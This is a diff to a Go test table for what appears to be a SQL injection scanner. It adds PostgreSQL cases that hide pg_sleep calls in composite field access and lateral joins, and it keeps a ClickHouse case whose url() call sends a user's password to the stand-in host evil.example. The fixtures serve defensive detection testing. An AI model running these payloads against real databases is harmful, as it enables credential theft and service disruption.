@@ -42,6 +42,14 @@ func TestScan_TableFunctionsAndSubscripts(t *testing.T) {
 		sql     string
 		want    PatternType
 	}{
+		{"postgresql composite field in select", keywords.DialectPostgreSQL,
+			"SELECT (make_item(pg_sleep(5))).name FROM t", PatternTimeBased},
+		{"postgresql composite field in where", keywords.DialectPostgreSQL,
+			"SELECT * FROM t WHERE (make_item(pg_sleep(5))).name = 'x'", PatternTimeBased},
+		{"postgresql composite field in argument", keywords.DialectPostgreSQL,
+			"SELECT length((make_item(pg_sleep(5))).name) FROM t", PatternTimeBased},
+		{"postgresql joined function arguments", keywords.DialectPostgreSQL,
+			"SELECT * FROM t CROSS JOIN LATERAL make_item(pg_sleep(5)) f", PatternTimeBased},
 		{"clickhouse url exfiltration", keywords.DialectClickHouse,
 			"SELECT * FROM url('http://evil.example/x?d=' || (SELECT password FROM users LIMIT 1), CSV, 'a String')",
 			PatternOutOfBand},
